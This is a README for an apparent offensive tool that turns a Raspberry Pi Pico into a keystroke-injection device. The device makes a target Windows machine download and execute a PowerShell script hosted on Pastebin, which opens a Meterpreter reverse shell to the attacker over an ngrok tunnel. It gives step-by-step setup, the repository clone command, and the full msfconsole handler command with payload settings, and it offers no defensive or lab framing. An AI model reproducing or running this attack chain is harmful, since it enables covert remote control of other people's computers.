# Pico_Rubber_Meterpreter
> Tested on XFCE Kail
 
## Requirements
- ngrok authtoken
- pico / pico w for pico-ducky
- pastebin free developer api key


# Setup

## Required python module
Install python `requests` module by  
```
pip3 install requests
```

## Ngrok

Install ngrok , for APT use command below
```
 curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok
```

Go [ngrok](https://ngrok.com/) for sign up free account  
`Dasd board` > `Getting Started` > `SetUp & Installation` > `2. Connect your account`  
Copy and run the command that looks like  
`ngrok config add-authtoken THIS_IS_YOUR_TOKEN`


## Pastebin
> For pasting powershell script (ps1) that will be download and execute on target machine

Go [pastebin](https://pastebin.com/) for sign up free account  
`API` > `Your Unique Developer API Key` > `COPY YOUR API KEY`

In `main.py`  
found this code and paste your pastebin api key
```
PASTEBIN_DEV_API_KEY = "YOUR_API_KEY"
```


## Pico-Ducky
[Pico-Ducky full-install-instructions](https://github.com/dbisu/pico-ducky#full-install-instructions)  
[Setup mode](https://github.com/dbisu/pico-ducky#setup-mode-1)  
[enable/disable USB mode](https://github.com/dbisu/pico-ducky#usb-enabledisable-mode-1)

# Usage
Clone this repo  
```
git clone https://github.com/powenn/Pico_Rubber_Meterpreter.git
```
Mount pico / pico w in USB enable mode and setup mode  
```
cd  Pico_Rubber_Meterpreter && python3 main.py
```
Enter port for ngrok , for example : `4444`  
A new terminal window should show up  
Copy and paste `ngrok url`  which display in new terminal window , for example : `0.tcp.jp.ngrok.io:11111`  
Waiting for msfconsole window show up  
If failed , copy and run msfconsole command manually , the commnad looks like below  
`msfconsole -q -x 'use multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost 0.0.0.0;set lport 5556;exploit'`  
If handler not running , Enter `run` for run
